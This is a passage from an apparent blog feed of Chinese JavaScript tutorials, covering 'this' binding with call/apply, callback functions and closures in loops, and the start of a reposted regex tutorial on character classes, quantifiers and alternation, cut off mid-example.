class="built_in">console</span>.log(point.x); <span class="comment">//==&gt;0 </span></span><br><span class="line"><span class="built_in">console</span>.log(point.y); <span class="comment">//==&gt;0 </span></span><br><span class="line"><span class="built_in">console</span>.log(x); <span class="comment">//==&gt;1 </span></span><br><span class="line"><span class="built_in">console</span>.log(y); <span class="comment">//==&gt;1</span></span><br></pre></td></tr></table></figure><p>这属于 JavaScript 的设计缺陷，正确的设计方式是内部函数的 this 应该绑定到其外层函数对应的对象上，为了规避这一设计缺陷，聪明的 JavaScript 程序员想出了变量替代的方法，约定俗成，该变量一般被命名为 that。 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> point = &#123; </span><br><span class="line">    x : <span class="number">0</span>, </span><br><span class="line">    y : <span class="number">0</span>, </span><br><span class="line">    moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123; </span><br><span class="line">        <span class="comment">//调用move函数To的对象为point,所以这里的that和this指向point</span></span><br><span class="line">        <span class="keyword">var</span> that = <span class="keyword">this</span>; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> moveX = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">            that.x = x; </span><br><span class="line">        &#125;; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> moveY = <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123; </span><br><span class="line">            that.y = y; </span><br><span class="line">        &#125; </span><br><span class="line">        moveX(x); </span><br><span class="line">        moveY(y); </span><br><span class="line">   &#125; </span><br><span class="line">&#125;; </span><br><span class="line">point.moveTo(<span class="number">1</span>, <span class="number">1</span>); </span><br><span class="line">point.x; <span class="comment">//==&gt;1 </span></span><br><span class="line">point.y; <span class="comment">//==&gt;1</span></span><br></pre></td></tr></table></figure><h2 id="4-构造函数中this的指向"><a href="#4-构造函数中this的指向" class="headerlink" title="4. 构造函数中this的指向"></a>4. 构造函数中this的指向</h2><p>JavaScript 支持面向对象式编程，与主流的面向对象式编程语言不同，JavaScript 并没有类（class）的概念，而是使用基于原型（prototype）的继承方式。相应的，JavaScript 中的构造函数也很特殊，如果不使用 new 调用，则和普通函数一样。作为又一项约定俗成的准则，构造函数以大写字母开头，提醒调用者使用正确的方式调用。如果调用正确，this 绑定到新创建的对象上。 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line"><span class="keyword">this</span>.x = x; </span><br><span class="line"><span class="keyword">this</span>.y = y; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Point(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(p.x);<span class="comment">//==&gt;1,this指向对象p</span></span><br></pre></td></tr></table></figure><h2 id="5-apply或call调用"><a href="#5-apply或call调用" class="headerlink" title="5. apply或call调用"></a>5. apply或call调用</h2><p>在 JavaScript 中函数也是对象，对象则有方法，apply 和 call 就是函数对象的方法。这两个方法异常强大，他们允许切换函数执行的上下文环境（context），即 this 绑定的对象。很多 JavaScript 中的技巧以及类库都用到了该方法。 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line">   <span class="keyword">this</span>.x = x; </span><br><span class="line">   <span class="keyword">this</span>.y = y; </span><br><span class="line">   <span class="keyword">this</span>.moveTo = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line">       <span class="keyword">this</span>.x = x; </span><br><span class="line">       <span class="keyword">this</span>.y = y; </span><br><span class="line">   &#125; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line"><span class="keyword">var</span> p2 = &#123;<span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span>&#125;; </span><br><span class="line">p1.moveTo(<span class="number">1</span>, <span class="number">1</span>); </span><br><span class="line">p1.moveTo.apply(p2, [<span class="number">10</span>, <span class="number">10</span>]);</span><br></pre></td></tr></table></figure><p>在上面的例子中，我们使用构造函数生成了一个对象 p1，该对象同时具有 moveTo 方法；使用对象字面量创建了另一个对象 p2，我们看到使用 apply 可以将 p1 的方法应用到 p2 上，这时候 this 也被绑定到对象 p2 上。另一个方法 call 也具备同样功能，不同的是最后的参数不是作为一个数组统一传入，而是分开传入的。 </p><p>部分转载自<a href="https://www.ibm.com/developerworks/cn/web/1207_wangqf_jsthis/index.html，" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/web/1207_wangqf_jsthis/index.html，</a></p><p><a href="https://juejin.im/post/5a0d9ff4f265da432e5b91da" target="_blank" rel="noopener">https://juejin.im/post/5a0d9ff4f265da432e5b91da</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>回调函数</title>
      <link href="2018/10/11/%E6%95%B4%E7%90%86-%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"/>
      <url>2018/10/11/%E6%95%B4%E7%90%86-%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>A callback is a function that is passed as an argument to another function and is executed after its parent function has completed。</p><a id="more"></a> <h1 id="什么是回调函数"><a href="#什么是回调函数" class="headerlink" title="什么是回调函数"></a>什么是回调函数</h1><h2 id="定义一"><a href="#定义一" class="headerlink" title="定义一"></a>定义一</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A callback is a function that is passed as an argument to another function and is executed after its parent function has completed。</span><br></pre></td></tr></table></figure><p>回调函数就是一个参数，将这个函数作为参数传到另一个函数里面，当那个函数执行完之后，再执行传进去的这个函数。这个过程就叫做回调。 </p><h2 id="定义二"><a href="#定义二" class="headerlink" title="定义二"></a>定义二</h2><p>当程序跑起来时，一般情况下，应用程序（application program）会时常通过API调用库里所预先备好的函数。但是有些库函数（library function）却要求应用先传给它一个函数，好在合适的时候调用，以完成目标任务。这个被传入的、后又被调用的函数就称为回调函数（callback function）。</p><p>通常将一个函数B传入另一个函数A，并且在需要的时候再调用函数A。</p><p>说白了，回调就是回溯，先定义好将要使用的函数体，然后在使用使再调用这个函数，我们通常把callback作为一个参数传入先定义的那个函数。下面我们先来看一段jquery代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"p"</span>).hide(<span class="number">1000</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">alert(<span class="string">"The paragraph is now hidden"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面jquery就是一个回调函数，首先它在执行完hide效果后，接着调用function回调函数。</p><p>我们再来看一段JS代码，看看回调函数是如何实现的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Buy</span>(<span class="params">name,goods1,callback</span>) </span>&#123;</span><br><span class="line">    alert(name+<span class="string">' buy '</span>+goods1);</span><br><span class="line">    <span class="keyword">if</span>(callback&amp;&amp;<span class="keyword">typeof</span>(callback)===<span class="string">"function"</span>)</span><br><span class="line">        callback();</span><br><span class="line">&#125;</span><br><span class="line">Buy(<span class="string">'xiaoming'</span>,<span class="string">'apple'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">"shopping finish"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="闭包与回调"><a href="#闭包与回调" class="headerlink" title="闭包与回调"></a>闭包与回调</h1><p>下面看一道闭包的题目，分别点击第一个和第四个节点，执行结果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nodes = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'button'</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nodes.length; i++) &#123;</span><br><span class="line">    nodes[i].addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'You clicked element #'</span> + i);</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里虽然主要考的是闭包，addEventListener是一个闭包，而匿名函数是一个回调函数，i是在闭包中的变量。在addEventListener的回调执行时，循环已经结束，此时的变量i被赋值为node.length，node.length为总节点数。所以结果就是</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You clicked element # node.length</span><br></pre></td></tr></table></figure><p>那要怎么改，将其返回值改成函数，既然i变量的值会被释放，那我们就引入i，让每次循环的值都保存在内存中，就可以了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nodes = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'button'</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nodes.length; i++) &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    nodes[i].addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'You clicked element #'</span> + i);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考<a href="https://blog.csdn.net/jingege0318/article/details/62447345" target="_blank" rel="noopener">https://blog.csdn.net/jingege0318/article/details/62447345</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="2018/10/03/%E6%95%B4%E7%90%86-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>2018/10/03/%E6%95%B4%E7%90%86-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="JS正则表达式完整教程（略长）"><a href="#JS正则表达式完整教程（略长）" class="headerlink" title="JS正则表达式完整教程（略长）"></a>JS正则表达式完整教程（略长）</h1><p>转载自<a href="https://juejin.im/post/5965943ff265da6c30653879" target="_blank" rel="noopener">https://juejin.im/post/5965943ff265da6c30653879</a></p><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>亲爱的读者朋友，如果你点开了这篇文章，说明你对正则很感兴趣。</p><p>想必你也了解正则的重要性，在我看来正则表达式是衡量程序员水平的一个侧面标准。</p><p>关于正则表达式的教程，网上也有很多，相信你也看了一些。</p><p>与之不同的是，本文的目的是希望所有认真读完的童鞋们，都有实质性的提高。</p><p>本文内容共有七章，用JavaScript语言完整地讨论了正则表达式的方方面面。</p><p>如果觉得文章某块儿没有说明白清楚，欢迎留言，能力范围之内，老姚必做详细解答。</p><p>具体章节如下：</p><ul><li>引言</li><li>第一章 正则表达式字符匹配攻略</li><li>第二章 正则表达式位置匹配攻略</li><li>第三章 正则表达式括号的作用</li><li>第四章 正则表达式回溯法原理</li><li>第五章 正则表达式的拆分</li><li>第六章 正则表达式的构建</li><li>第七章 正则表达式编程</li><li>后记</li></ul><p>下面简单地说说每一章都讨论了什么？</p><p><strong>正则是匹配模式，要么匹配字符，要么匹配位置。</strong></p><p>第1章和第2章以这个角度去讲解了正则的基础。</p><p><strong>在正则中可以使用括号捕获数据，要么在API中进行分组引用，要么在正则里进行反向引用。</strong></p><p>这是第3章的主题，讲解了正则中括号的作用。</p><p><strong>学习正则表达式，是需要了解其匹配原理的。</strong></p><p>第4章，讲解了正则了正则表达式的回溯法原理。另外在第6章里，也讲解了正则的表达式的整体工作原理。</p><p><strong>不仅能看懂别人的正则，还要自己会写正则。</strong></p><p>第5章，是从读的角度，去拆分一个正则表达式，而第6章是从写的角度，去构建一个正则表达式。</p><p><strong>学习正则，是为了在真实世界里应用的。</strong></p><p>第7章讲解了正则的用法，和相关API需要注意的地方。</p><p><strong>如何阅读本文？</strong></p><p>我的建议是阅读两遍。第一遍，不求甚解地快速阅读一遍。阅读过程中遇到的问题不妨记录下来，也许阅读完毕后就能解决很多。然后有时间的话，再带着问题去精读第二遍。</p><p>深呼吸，开始我们的正则表达式旅程吧。我在终点等你。</p><h2 id="第一章-正则表达式字符匹配攻略"><a href="#第一章-正则表达式字符匹配攻略" class="headerlink" title="第一章 正则表达式字符匹配攻略"></a>第一章 正则表达式字符匹配攻略</h2><p>正则表达式是匹配模式，要么匹配字符，要么匹配位置。请记住这句话。</p><p>然而关于正则如何匹配字符的学习，大部分人都觉得这块比较杂乱。</p><p>毕竟元字符太多了，看起来没有系统性，不好记。本章就解决这个问题。</p><p>内容包括：</p><ol><li>两种模糊匹配</li><li>字符组</li><li>量词</li><li>分支结构</li><li>案例分析</li></ol><h3 id="1-两种模糊匹配"><a href="#1-两种模糊匹配" class="headerlink" title="1 两种模糊匹配"></a>1 两种模糊匹配</h3><p>如果正则只有精确匹配是没多大意义的，比如<code>/hello/</code>，也只能匹配字符串中的”hello”这个子串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var regex = /hello/;</span><br><span class="line">console.log( regex.test(&quot;hello&quot;) ); </span><br><span class="line">// =&gt; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>正则表达式之所以强大，是因为其能实现模糊匹配。</p><p>而模糊匹配，有两个方向上的“模糊”：横向模糊和纵向模糊。</p><p><strong>1.1 横向模糊匹配</strong></p><p>横向模糊指的是，一个正则可匹配的字符串的长度不是固定的，可以是多种情况的。</p><p>其实现的方式是使用量词。譬如<code>{m,n}</code>，表示连续出现最少m次，最多n次。</p><p>比如<code>/ab{2,5}c/</code>表示匹配这样一个字符串：第一个字符是“a”，接下来是2到5个字符“b”，最后是字符“c”。测试如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /ab&#123;2,5&#125;c/g;</span><br><span class="line">var string = &quot;abc abbc abbbc abbbbc abbbbbc abbbbbbc&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">// =&gt; [&quot;abbc&quot;, &quot;abbbc&quot;, &quot;abbbbc&quot;, &quot;abbbbbc&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>注意：案例中用的正则是<code>/ab{2,5}c/g</code>，后面多了<code>g</code>，它是正则的一个修饰符。表示全局匹配，即在目标字符串中按顺序找到满足匹配模式的所有子串，强调的是“所有”，而不只是“第一个”。g是单词global的首字母。</p><p><strong>1.2 纵向模糊匹配</strong></p><p>纵向模糊指的是，一个正则匹配的字符串，具体到某一位字符时，它可以不是某个确定的字符，可以有多种可能。</p><p>其实现的方式是使用字符组。譬如<code>[abc]</code>，表示该字符是可以字符“a”、“b”、“c”中的任何一个。</p><p>比如<code>/a[123]b/</code>可以匹配如下三种字符串：”a1b”、”a2b”、”a3b”。测试如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /a[123]b/g;</span><br><span class="line">var string = &quot;a0b a1b a2b a3b a4b&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">// =&gt; [&quot;a1b&quot;, &quot;a2b&quot;, &quot;a3b&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>以上就是本章讲的主体内容，只要掌握横向和纵向模糊匹配，就能解决很大部分正则匹配问题。</p><p>接下来的内容就是展开说了，如果对此都比较熟悉的话，可以跳过，直接看本章案例那节。</p><h3 id="2-字符组"><a href="#2-字符组" class="headerlink" title="2. 字符组"></a>2. 字符组</h3><p>需要强调的是，虽叫字符组（字符类），但只是其中一个字符。例如<code>[abc]</code>，表示匹配一个字符，它可以是“a”、“b”、“c”之一。</p><p><strong>2.1 范围表示法</strong></p><p>如果字符组里的字符特别多的话，怎么办？可以使用范围表示法。</p><p>比如<code>[123456abcdefGHIJKLM]</code>，可以写成<code>[1-6a-fG-M]</code>。用连字符<code>-</code>来省略和简写。</p><p>因为连字符有特殊用途，那么要匹配“a”、“-”、“z”这三者中任意一个字符，该怎么做呢？</p><p>不能写成<code>[a-z]</code>，因为其表示小写字符中的任何一个字符。</p><p>可以写成如下的方式：<code>[-az]</code>或<code>[az-]</code>或<code>[a\-z]</code>。即要么放在开头，要么放在结尾，要么转义。总之不会让引擎认为是范围表示法就行了。</p><p><strong>2.2 排除字符组</strong></p><p>纵向模糊匹配，还有一种情形就是，某位字符可以是任何东西，但就不能是”a”、”b”、”c”。</p><p>此时就是排除字符组（反义字符组）的概念。例如<code>[^abc]</code>，表示是一个除”a”、”b”、”c”之外的任意一个字符。字符组的第一位放<code>^</code>（脱字符），表示求反的概念。</p><p>当然，也有相应的范围表示法。</p><p><strong>2.3 常见的简写形式</strong></p><p>有了字符组的概念后，一些常见的符号我们也就理解了。因为它们都是系统自带的简写形式。</p><blockquote><p><strong>\d</strong>就是<code>[0-9]</code>。表示是一位数字。记忆方式：其英文是digit（数字）。</p><p><strong>\D</strong>就是<code>[^0-9]</code>。表示除数字外的任意字符。</p><p><strong>\w</strong>就是<code>[0-9a-zA-Z_]</code>。表示数字、大小写字母和下划线。记忆方式：w是word的简写，也称单词字符。</p><p><strong>\W</strong>是<code>[^0-9a-zA-Z_]</code>。非单词字符。</p><p><strong>\s</strong>是<code>[ \t\v\n\r\f]</code>。表示空白符，包括空格、水平制表符、垂直制表符、换行符、回车符、换页符。记忆方式：s是space character的首字母。</p><p><strong>\S</strong>是<code>[^ \t\v\n\r\f]</code>。 非空白符。</p><p><strong>.</strong>就是<code>[^\n\r\u2028\u2029]</code>。通配符，表示几乎任意字符。换行符、回车符、行分隔符和段分隔符除外。记忆方式：想想省略号…中的每个点，都可以理解成占位符，表示任何类似的东西。</p></blockquote><p>如果要匹配任意字符怎么办？可以使用<code>[\d\D]</code>、<code>[\w\W]</code>、<code>[\s\S]</code>和<code>[^]</code>中任何的一个。</p><h3 id="3-量词"><a href="#3-量词" class="headerlink" title="3. 量词"></a>3. 量词</h3><p>量词也称重复。掌握<code>{m,n}</code>的准确含义后，只需要记住一些简写形式。</p><p><strong>3.1 简写形式</strong></p><blockquote><p><code>**{m,}**</code> 表示至少出现m次。</p><p><code>**{m}**</code> 等价于<code>{m,m}</code>，表示出现m次。</p><p><code>**?**</code> 等价于<code>{0,1}</code>，表示出现或者不出现。记忆方式：问号的意思表示，有吗？</p><p><code>**+**</code>等价于<code>{1,}</code>，表示出现至少一次。记忆方式：加号是追加的意思，得先有一个，然后才考虑追加。</p><p><code>*****</code> 等价于<code>{0,}</code>，表示出现任意次，有可能不出现。记忆方式：看看天上的星星，可能一颗没有，可能零散有几颗，可能数也数不过来。</p></blockquote><p><strong>3.2 贪婪匹配和惰性匹配</strong></p><p>看如下的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /\d&#123;2,5&#125;/g;</span><br><span class="line">var string = &quot;123 1234 12345 123456&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">// =&gt; [&quot;123&quot;, &quot;1234&quot;, &quot;12345&quot;, &quot;12345&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中正则<code>/\d{2,5}/</code>，表示数字连续出现2到5次。会匹配2位、3位、4位、5位连续数字。</p><p>但是其是贪婪的，它会尽可能多的匹配。你能给我6个，我就要5个。你能给我3个，我就3要个。反正只要在能力范围内，越多越好。</p><p>我们知道有时贪婪不是一件好事（请看文章最后一个例子）。而惰性匹配，就是尽可能少的匹配：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /\d&#123;2,5&#125;?/g;</span><br><span class="line">var string = &quot;123 1234 12345 123456&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">// =&gt; [&quot;12&quot;, &quot;12&quot;, &quot;34&quot;, &quot;12&quot;, &quot;34&quot;, &quot;12&quot;, &quot;34&quot;, &quot;56&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中<code>/\d{2,5}?/</code>表示，虽然2到5次都行，当2个就够的时候，就不在往下尝试了。</p><p>通过在量词后面加个问号就能实现惰性匹配，因此所有惰性匹配情形如下：</p><blockquote><p><code>**{m,n}?**</code><br><code>**{m,}?**</code><br><code>**??**</code><br><code>**+?**</code><br><code>***?**</code></p></blockquote><p>对惰性匹配的记忆方式是：量词后面加个问号，问一问你知足了吗，你很贪婪吗？</p><h3 id="4-多选分支"><a href="#4-多选分支" class="headerlink" title="4. 多选分支"></a>4. 多选分支</h3><p>一个模式可以实现横向和纵向模糊匹配。而多选分支可以支持多个子模式任选其一。</p><p>具体形式如下：<code>(p1|p2|p3)</code>，其中<code>p1</code>、<code>p2</code>和<code>p3</code>是子模式，用<code>|</code>（管道符）分隔，表示其中任何之一。</p><p>例如要匹配”good”和”nice”可以使用<code>/good|nice/</code>。测试如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /good|nice/g;</span><br><span class="line">var string = &quot;good idea, nice try.&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">// =&gt; [&quot;good&quot;, &quot;nice&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>但有个事实我们应该注意，比如我用<code>/good|goodbye/</code>，去匹配”goodbye”字符串时，结果是”good”：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /good|goodbye/g;</span><br><span class="line">var string = &quot;goodbye&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">// =&gt; [&quot;good&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>而把正则改成<code>/goodbye|good/</code>，结果是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /goodbye|good/g;</span><br><span class="line">var string = &quot;goodbye&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">// =&gt; [&quot;goodbye&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>也就是说，分支结构也是惰性的，即当前面的匹配上了，后面的就不再尝试了。</p><h3 id="5-案例分析"><a href="#5-案例分析" class="headerlink" title="5. 案例分析"></a>5. 案例分析</h3><p>匹配字符，无非就是字符组、量词和分支结构的组合使用罢了。</p><p>下面找几个例子演练一下（其中，每个正则并不是只有唯一写法）：</p><p><strong>5.1 匹配16进制颜色值</strong></p><p>要求匹配：</p><blockquote><p>#ffbbad</p><p>#Fc01DF</p><p>#FFF</p><p>#ffE</p></blockquote><p>分析：</p><p>表示一个16进制字符，可以用字符组<code>[0-9a-fA-F]</code>。</p><p>其中字符可以出现3或6次，需要是用量词和分支结构。</p><p>使用分支结构时，需要注意顺序。</p><p>正则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /#([0-9a-fA-F]&#123;6&#125;|[0-9a-fA-F]&#123;3&#125;)/g;</span><br><span class="line">var string = &quot;#ffbbad #Fc01DF #FFF #ffE&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">// =&gt; [&quot;#ffbbad&quot;, &quot;#Fc01DF&quot;, &quot;#FFF&quot;, &quot;#ffE&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>5.2 匹配时间</strong></p><p>以24小时制为例。</p><p>要求匹配：</p><blockquote><p>23:59</p><p>02:07</p></blockquote><p>分析：</p><p>共4位数字，第一位数字可以为<code>[0-2]</code>。</p><p>当第1位为2时，第2位可以为<code>[0-3]</code>，其他情况时，第2位为<code>[0-9]</code>。</p><p>第3位数字为<code>[0-5]</code>，第4位为<code>[0-9]</code></p><p>正则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /^([01][0-9]|[2][0-3]):[0-5][0-9]$/;</span><br><span class="line">console.log( regex.test(&quot;23:59&quot;) ); </span><br><span class="line">console.log( regex.test(&quot;02:07&quot;) ); </span><br><span class="line">// =&gt; true</span><br><span class="line">// =&gt; true复制代码</span><br></pre></td></tr></table></figure><p>如果也要求匹配7:9，也就是说时分前面的0可以省略。</p><p>此时正则变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var regex = /^(0?[0-9]|1[0-9]|[2][0-3]):(0?[0-9]|[1-5][0-9])$/;</span><br><span class="line">console.log( regex.test(&quot;23:59&quot;) ); </span><br><span class="line">console.log( regex.test(&quot;02:07&quot;) ); </span><br><span class="line">console.log( regex.test(&quot;7:9&quot;) ); </span><br><span class="line">// =&gt; true</span><br><span class="line">// =&gt; true</span><br><span class="line">// =&gt; true复制代码</span><br></pre></td></tr></table></figure><p><strong>5.3 匹配日期</strong></p><p>比如yyyy-mm-dd格式为例。</p><p>要求匹配：</p><blockquote><p>2017-06-10</p></blockquote><p>分析：</p><p>年，四位数字即可，可用<code>[0-9]{4}</code>。</p><p>月，共12个月，分两种情况01、02、……、09和10、11、12，可用<code>(0[1-9]|1[0-2])</code>。</p><p>日，最大31天，可用<code>(0[1-9]|[12][0-9]|3[01])</code>。</p><p>正则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var regex = /^[0-9]&#123;4&#125;-(0[1-9]|1[0-2])-(0[1-9]|[12][0-9]|3[01])$/;</span><br><span class="line">console.log( regex.test(&quot;2017-06-10&quot;) ); </span><br><span class="line">// =&gt; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>5.4 window操作系统文件路径</strong></p><p>要求匹配：</p><blockquote><p>F:\study\javascript\regex\regular expression.pdf</p><p>F:\study\javascript\regex\</p><p>F:\study\javascript</p><p>F:\</p></blockquote><p>分析：</p><p>整体模式是: 